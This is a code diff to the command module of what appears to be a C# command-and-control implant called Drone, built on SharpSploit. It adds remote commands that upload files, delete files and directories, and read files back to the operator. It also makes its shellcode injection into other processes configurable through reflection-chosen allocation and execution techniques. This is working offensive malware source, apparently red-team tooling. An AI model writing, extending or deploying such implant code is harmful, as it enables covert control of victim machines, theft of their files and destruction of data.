@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Diagnostics;
+using System.Diagnostics;   
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
@@ -13,6 +14,8 @@ using Drone.Models;
 using Drone.Modules;
 using Drone.SharpSploit.Enumeration;
 using Drone.SharpSploit.Execution;
+
+using Assembly = Drone.SharpSploit.Execution.Assembly;
 
 namespace Drone
 {
@@ -30,6 +33,27 @@ namespace Drone
             new ("ls", "List filesystem", GetDirectoryListing, new List<Command.Argument>
             {
                 new("path")
+            }),
+            new("upload", "Upload a file to the current working directory of the Drone", UploadFile, new List<Command.Argument>
+            {
+               new("/path/to/origin", false, true),
+               new ("destination-filename" ,false)
+            }),
+            new("rm", "Delete a file", DeleteFile, new List<Command.Argument>
+            {
+               new("/path/to/file", false)
+            }),
+            new("rmdir", "Delete a directory", DeleteDirectory, new List<Command.Argument>
+            {
+                new("/path/to/directory", false)
+            }),
+            new("mkdir", "Create a directory", CreateDirectory, new List<Command.Argument>
+            {
+               new("/path/to/new-dir", false) 
+            }),
+            new("cat", "Read a file as text", ReadTextFile, new List<Command.Argument>
+            {
+                new("/path/to/file.txt")
             }),
             new("ps", "List running processes", GetProcessListing),
             new ("getuid", "Get current identity", GetCurrentIdentity),
@@ -61,7 +85,7 @@ namespace Drone
             {
                 new("/path/to/shellcode.bin", false, true),
                 new("pid", false)
-            }),
+            })
         };
 
         private void GetCurrentDirectory(DroneTask task, CancellationToken token)
@@ -89,6 +113,33 @@ namespace Drone
             var result = Host.GetDirectoryListing(directory);
             
             Drone.SendResult(task.TaskGuid, result.ToString());
+        }
+
+        private void UploadFile(DroneTask task, CancellationToken token)
+        {
+            var path = Path.Combine(Host.GetCurrentDirectory(), task.Arguments[0]);
+            File.WriteAllBytes(path, Convert.FromBase64String(task.Artefact));
+        }
+        
+        private void DeleteFile(DroneTask task, CancellationToken token)
+        {
+            File.Delete(task.Arguments[0]);
+        }
+
+        private void DeleteDirectory(DroneTask task, CancellationToken token)
+        {
+            Directory.Delete(task.Arguments[0]);
+        }
+        
+        private void CreateDirectory(DroneTask task, CancellationToken token)
+        {
+            Directory.CreateDirectory(task.Arguments[0]);
+        }
+        
+        private void ReadTextFile(DroneTask task, CancellationToken token)
+        {
+            var text = File.ReadAllText(task.Arguments[0]);
+            Drone.SendResult(task.TaskGuid, text);
         }
         
         private void GetProcessListing(DroneTask task, CancellationToken token)
@@ -126,7 +177,7 @@ namespace Drone
         private void ExecuteAssembly(DroneTask task, CancellationToken token)
         {
             var asm = Convert.FromBase64String(task.Artefact);
-            var result = Assembly.Execute(asm, task.Arguments);
+            var result = Assembly.AssemblyExecute(asm, task.Arguments);
 
             Drone.SendResult(task.TaskGuid, result);
         }
@@ -205,10 +256,20 @@ namespace Drone
 
             var shellcode = Convert.FromBase64String(task.Artefact);
             var payload = new PICPayload(shellcode);
-            var alloc = new SectionMapAlloc();
-            var exec = new RemoteThreadCreate();
 
-            var success = Injector.Inject(payload, alloc, exec, process);
+            var allocType = Config.GetConfig<Type>("AllocationTechnique");
+            var execType = Config.GetConfig<Type>("ExecutionTechnique");
+            
+            var self = System.Reflection.Assembly.GetCallingAssembly();
+            var types = self.GetTypes();
+
+            var allocationTechnique = (from type in types where type == allocType
+                select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
+            
+            var executionTechnique = (from type in types where type == execType
+                select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();
+
+            var success = Injector.Inject(payload, allocationTechnique, executionTechnique, process);
 
             if (success)
             {
@@ -218,7 +279,7 @@ namespace Drone
             
             Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");
         }
-        
+
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate string GenericDelegate(string input);
     }
